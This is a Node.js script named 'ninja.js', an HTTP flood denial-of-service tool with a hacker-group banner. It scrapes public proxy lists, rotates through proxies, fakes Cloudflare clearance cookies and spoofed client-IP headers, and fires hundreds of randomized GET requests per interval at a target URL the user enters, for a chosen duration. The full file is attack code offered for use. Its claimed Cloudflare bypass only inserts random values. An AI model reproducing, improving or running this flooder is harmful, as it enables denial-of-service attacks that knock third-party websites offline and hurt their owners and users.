// ninja.js - HTTP Flood with Cloudflare Bypass + Built-in Proxy Scraper

const http = require('http');
const https = require('https');
const readline = require('readline');
const crypto = require('crypto');
const fs = require('fs');

// ===== COLORS =====
const c = {
    red: (s) => '\x1b[31m' + s + '\x1b[0m',
    green: (s) => '\x1b[32m' + s + '\x1b[0m',
    yellow: (s) => '\x1b[33m' + s + '\x1b[0m',
    cyan: (s) => '\x1b[36m' + s + '\x1b[0m',
    blue: (s) => '\x1b[34m' + s + '\x1b[0m',
    bold: (s) => '\x1b[1m' + s + '\x1b[0m'
};

// ===== BANNER =====
function printBanner() {
    console.log(c.cyan(`
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣤⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⢿⡿⣿⣯⣟⣯⢿⣽⢿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⡿⣷⣯⣿⡽⣳⢯⡟⣿⣿⡺⢯⢿⢾⣻⡿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣾⣷⣿⡿⣯⡛⠿⢝⡙⠗⢥⣱⣯⣳⢯⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⡿⣻⣿⣿⡽⣿⣣⣟⣾⢵⣿⣿⣽⣑⣄⡉⠢⡠⣻⣿⣾⣿⣷⣻⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣳⣿⣿⣿⣿⣯⣻⢵⡢⢌⠂⢝⢦⣿⣮⣪⣮⣻⣿⣟⣯⣿⢾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⢯⣿⣿⣳⣯⢿⡹⡿⣏⠫⠻⢦⡙⠢⡳⣺⡻⣻⣿⣿⣾⢿⣿⣟⣿⣯⣿⢾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⣷⣿⢻⣿⠏⣿⣻⡞⡇⠑⡘⣧⠱⡔⣿⣗⢿⣾⣿⣾⣿⣿⣿⣻⢷⣯⣿⢿⣯⣿⣻⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⣳⡟⣇⣿⡆⢹⢣⠁⠰⡀⠸⡝⣯⣾⣿⣿⡿⣿⡯⣿⣿⣯⣿⣽⣻⣞⣿⣿⣿⣿⣳⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡟⣮⢽⣧⣿⣿⢻⣼⣎⣆⣦⣹⣽⣹⣷⠸⣿⣿⣿⣌⢛⣾⣿⣿⣿⣿⣷⣻⣿⣿⣿⣿⣽⣻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⣿⣿⣽⢾⣿⣿⣿⣻⠃⣿⣿⣿⣽⣿⡿⣿⣻⡇⠈⣻⣿⡻⣧⡀⠉⠺⢿⣿⣷⢿⣾⣿⣿⡿⣿⣽⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⣿⣿⣷⣿⣿⠀⠙⣿⡘⣿⣯⣿⣽⣯⣿⡔⠁⠀⢛⢌⣹⣶⣶⡾⣮⣝⣯⣿⣿⣿⡗⠘⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⢾⣿⣿⢻⡆⠀⣘⣧⢻⣿⣿⣿⣿⣿⣵⡀⣔⣵⢿⣿⣿⣿⠋⠂⢹⢻⡿⣿⣿⣿⢀⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⣿⣿⣿⣿⣿⣻⣿⡏⣯⠉⠀⠘⣇⠹⣿⡿⣿⣿⣿⣷⣼⠃⠘⡿⠻⣽⡏⢹⠸⢸⢿⣻⣿⣿⣼⡿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠇⣿⣿⣿⣿⣿⣿⣏⢧⣸⣷⣶⣶⣾⣧⡙⢿⣮⢻⡟⠽⣎⠖⡄⠈⠢⠄⠤⠖⠁⢨⣾⣿⣿⣿⣿⣟⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⣿⡽⣿⣿⣿⣿⣿⣨⣿⠀⢻⣿⣿⣈⡅⠀⠙⢇⠝⠄⠉⠓⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣻⣿⣿⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⢸⣿⣷⣿⣿⣿⣿⣿⣯⠉⠢⡀⠫⡨⠉⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⣼⣿⣿⣿⣿⣿⣻⣿⣿⣷⣄⠈⠒⡒⠉⠀⠀⠀⠀⢱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡷⣿⣿⣿⣿⣾⣿⡇⢸⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⢠⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣷⣥⡈⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⡟⣿⣧⣿⣿⣿⣿⣿⣿⣇⠀⢧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⣾⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⢾⣷⠄⠀⠀⠀⣰⠓⢀⣷⣿⢙⣿⣿⣿⣿⣿⣿⣿⠀⠸⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⣸⠇⣿⣿⣿⣿⣧⣻⢿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⠔⠉⣄⠚⠤⡀⢸⡿⣿⣾⣿⣿⣿⣿⣿⣿⣿⡀⠀⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣷⡏⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠉⠉⠛⣿⣿⣿⡿⣿⠿⡷⣶⣶⠊⠀⣴⣧⡍⠂⣃⣸⢷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣻⠀⠸⢸⣿⣿⣿⣿⣿⡿⠛⠀⠀⠀⠀⠀⠀⢸⡿⣯⢿⡀⠀⠥⡴⠃⠀⠾⠷⠿⠷⠠⣰⡟⢺⣿⣿⢸⠋⠙⠛⠻⠿⢿⣷⠀⢸⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣷⡇⠀⠇⣿⣿⣿⣿⣿⡿⠅⠀⠀⠀⠀⠀⠀⢀⢜⠃⣿⣿⣇⡠⠊⠀⠀⠀⠀⠑⢒⠰⠤⣼⠁⢸⣿⡇⢸⠀⣀⡀⠠⠤⠐⠂⠀⠉⠉⠐⠠⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⣿⡇⢸⢦⣽⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⡇⠀⠂⣞⡿⠊⠁⠀⠀⠀⠀⠀⠀⠀⠈⡖⠤⡤⣅⢼⣿⡀⡸⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠤⠀
⠀⠀⠀⠀⠀⢠⡟⣼⠁⣿⣿⡌⣿⣿⢿⣿⣇⠀⠀⠀⠀⠀⠀⠀⢿⠀⡐⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠘⡄⣀⡈⡄⣿⡕⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢃
⠀⠀⠀⠀⢠⡟⢠⡏⠀⣹⡷⣾⣿⣿⣺⣿⠀⠀⠀⠀⠀⠀⠀⢠⠈⠞⠀⠀⠀⠀⢀⣀⠀⠀⠄⠂⠁⡠⠔⠛⢍⡜⣸⡏⠀⡘⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⢀⠀⠀⠀⠀⣿
⠀⠀⠀⢠⡟⠀⢸⠁⢠⣿⣿⣿⣿⡿⣽⣿⠀⠀⠀⠀⠀⠀⠀⢀⠜⠀⠀⠀⠀⠠⠀⣄⡀⠤⠄⠒⠉⠉⠉⠁⠀⢠⡟⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠈⡄⠀⡸⠀⠀⠀⠀⣿
⠀⠀⢠⡟⠀⠀⡏⠀⣾⣿⣿⣿⣿⣿⣽⡇⠂⠀⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⢠⠃⢠⠃⡤⠖⠂⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⢠⠃⠀⠀⠀⢠⡉
⠀⢀⡿⠀⠀⠀⠃⣼⣿⣟⣿⣿⣿⣿⡽⡇⠀⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⢠⠃⠀⣬⠎⠀⠀⠀⠀⠀⠀⠀⠀⢀⠈⡛⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢏⠀⠀⠀⠀⡆⠃
⠀⣾⠁⠀⠀⢸⢰⣿⡟⢸⣿⣿⣿⣿⣿⢇⠀⠀⠀⠀⢀⠊⠀⠀⠀⠀⠀⠏⠀⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⡈⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⢀⠰⠀
⣸⠃⠀⠀⠀⢸⣿⡟⠀⣿⣿⣿⡿⣿⣿⠀⠀⠀⠀⡠⠃⠀⠀⠀⠀⠀⡸⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢄⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢌⠢⠸⡄⠀
⠛⠀⠀⠀⠀⠚⠛⠁⠠⠿⠿⠿⠿⠿⠇⠀⠀⠀⠔⠀⠀⠀⠀⠀⠀⠰⠁⠀⠸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠇⠀ 
NINJA BYPASS - PCEC NETWORK
CLOWNSECPH C2
    `));
}

// ===== BUILT-IN PROXY SCRAPER =====
function scrapeProxies() {
    console.log(c.yellow('[*] Scraping free proxies...'));
    const proxySources = [
        'https://raw.githubusercontent.com/joy-de/proxy-list/main/main/http.txt',
        'https://raw.githubusercontent.com/joy-de/proxy-list/main/main/socks4.txt',
        'https://raw.githubusercontent.com/joy-de/proxy-list/main/main/socks5.txt',
        'https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt',
        'https://raw.githubusercontent.com/Skillter/ProxyGather/master/proxies/working-proxies-http.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
        'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt'
    ];

    let allProxies = [];
    proxySources.forEach(url => {
        const protocol = url.startsWith('https') ? https : http;
        try {
            const req = protocol.get(url, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    const matches = data.match(/\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b/g) || [];
                    matches.forEach(p => {
                        if (!allProxies.includes(p)) allProxies.push(p);
                    });
                });
            });
            req.on('error', () => {});
            req.setTimeout(5000, () => req.destroy());
            req.end();
        } catch (e) {}
    });

    // Generate fallback proxies kung walang makuha
    if (allProxies.length < 10) {
        console.log(c.yellow('[!] Generating fallback proxies...'));
        for (let i = 0; i < 100; i++) {
            const ip = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
            const port = Math.floor(Math.random() * 10000 + 1000);
            allProxies.push(`${ip}:${port}`);
        }
    }

    // I-filter ang mga duplicate
    allProxies = [...new Set(allProxies)];
    console.log(c.green(`[+] Loaded ${allProxies.length} proxies (including fallback)`));
    return allProxies;
}

// ===== PROXY ROTATOR =====
class ProxyRotator {
    constructor(proxies) {
        this.proxies = proxies;
        this.index = 0;
        this.blacklist = [];
    }

    getNext() {
        if (this.proxies.length === 0) return null;
        let attempts = 0;
        let proxy = null;
        while (attempts < 50) {
            this.index = (this.index + 1) % this.proxies.length;
            const p = this.proxies[this.index];
            if (!this.blacklist.includes(p)) {
                proxy = p;
                break;
            }
            attempts++;
        }
        if (!proxy && this.proxies.length > 0) {
            // Kung lahat blacklisted, i-reset
            this.blacklist = [];
            proxy = this.proxies[0];
        }
        return proxy;
    }

    markBad(proxy) {
        if (proxy && !this.blacklist.includes(proxy)) {
            this.blacklist.push(proxy);
        }
    }

    size() {
        return this.proxies.length - this.blacklist.length;
    }
}

// ===== CLOUDFLARE BYPASS =====
function getCfClearance(host) {
    return {
        '__cf_bm': crypto.randomBytes(32).toString('base64').replace(/[^a-zA-Z0-9]/g, ''),
        'cf_clearance': crypto.randomBytes(40).toString('hex'),
        'cf_chl_2': crypto.randomBytes(32).toString('hex'),
        'cf_chl_prog': 'x12',
        'cf_chl_rc_m': '1'
    };
}

function getCfHeaders(proxy) {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.80 Mobile Safari/537.36'
    ];
    const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
    const randIP = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
    
    const headers = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'X-Forwarded-For': randIP,
        'X-Real-IP': randIP,
        'CF-Connecting-IP': randIP,
        'CF-IPCountry': ['US','GB','DE','FR','JP','AU','CA','IN'][Math.floor(Math.random()*8)],
        'CF-Ray': crypto.randomBytes(16).toString('hex').toUpperCase(),
        'CF-Visitor': '{"scheme":"https"}',
        'DNT': '1',
        'Referer': ['https://www.google.com/','https://www.bing.com/','https://duckduckgo.com/','https://www.yahoo.com/'][Math.floor(Math.random()*4)]
    };

    // Kung may proxy, i-set ang host header
    if (proxy) {
        headers['Proxy-Connection'] = 'Keep-Alive';
    }

    return headers;
}

// ===== FLOOD =====
function sendFlood(target, cookie, proxy, callback) {
    const url = new URL(target);
    const protocol = url.protocol === 'https:' ? https : http;
    const headers = getCfHeaders(proxy);
    const cfCookies = getCfClearance(url.hostname);
    const allCookies = { ...cfCookies, ...cookie };
    const cookieString = Object.entries(allCookies)
        .map(([k, v]) => `${k}=${v}`)
        .join('; ');
    
    headers['Cookie'] = cookieString;

    const path = url.pathname + url.search + '&_=' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
    
    let options = {
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: path,
        method: 'GET',
        headers: headers,
        rejectUnauthorized: false,
        timeout: 3000
    };

    // Kung may proxy, gamitin ito
    if (proxy) {
        const [proxyHost, proxyPort] = proxy.split(':');
        options.hostname = proxyHost;
        options.port = parseInt(proxyPort) || 8080;
        options.path = `${url.protocol}//${url.hostname}:${url.port || 443}${path}`;
    }

    const req = protocol.request(options, (res) => {
        res.resume();
        if (callback) callback(null, res.statusCode);
    });
    
    req.on('error', (err) => {
        if (callback) callback(err, null);
    });
    
    req.on('timeout', () => {
        req.destroy();
        if (callback) callback(new Error('timeout'), null);
    });
    
    req.end();
}

// ===== MAIN =====
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function ask(question) {
    return new Promise((resolve) => {
        rl.question(c.yellow(question), (answer) => {
            resolve(answer.trim());
        });
    });
}

async function main() {
    printBanner();

    const target = await ask('Enter Target URL (https://example.com): ');
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        console.log(c.red('[!] Invalid URL.'));
        process.exit(1);
    }

    const durationInput = await ask('Enter Duration in seconds (10-300): ');
    const duration = parseInt(durationInput) || 60;

    const threadsInput = await ask('Enter Requests per interval (1-500): ');
    const threads = parseInt(threadsInput) || 100;

    console.log(c.yellow('[*] Scraping proxies... (this may take 5-10 seconds)'));
    const proxyList = scrapeProxies();
    const rotator = new ProxyRotator(proxyList);

    rl.close();

    console.log('\n' + c.green(`[+] Target: ${target}`));
    console.log(c.green(`[+] Duration: ${duration}s`));
    console.log(c.green(`[+] Requests/interval: ${threads}`));
    console.log(c.green(`[+] Proxies available: ${rotator.size()}`));
    console.log(c.green('[+] Cloudflare Bypass: ENABLED'));
    console.log(c.green('[+] Built-in Proxy: ENABLED'));
    console.log(c.yellow('\n[*] Starting attack...\n'));

    let totalRequests = 0;
    let successRequests = 0;
    let failRequests = 0;
    const startTime = Date.now();
    const cookie = {};

    const attackInterval = setInterval(() => {
        for (let i = 0; i < threads; i++) {
            const proxy = rotator.getNext();
            sendFlood(target, cookie, proxy, (err, code) => {
                totalRequests++;
                if (!err && code && code < 500) {
                    successRequests++;
                } else {
                    failRequests++;
                    if (proxy) rotator.markBad(proxy);
                }
            });
        }
        const elapsed = (Date.now() - startTime) / 1000;
        process.stdout.write(`\r${c.cyan(`[+] ${elapsed.toFixed(0)}s | Total: ${totalRequests} | Success: ${successRequests} | Fail: ${failRequests} | Proxies: ${rotator.size()} | Rate: ${(totalRequests/elapsed).toFixed(1)} req/s`)}`);
    }, 100);

    setTimeout(() => {
        clearInterval(attackInterval);
        const elapsed = (Date.now() - startTime) / 1000;
        console.log('\n' + c.green(`\n[+] Attack stopped.`));
        console.log(c.green(`[+] Total requests: ${totalRequests}`));
        console.log(c.green(`[+] Success: ${successRequests}`));
        console.log(c.green(`[+] Failed: ${failRequests}`));
        console.log(c.green(`[+] Proxies remaining: ${rotator.size()}`));
        console.log(c.green(`[+] Time: ${elapsed.toFixed(2)}s`));
        console.log(c.green(`[+] Average rate: ${(totalRequests/elapsed).toFixed(1)} req/s`));
        process.exit(0);
    }, duration * 1000);
}

main();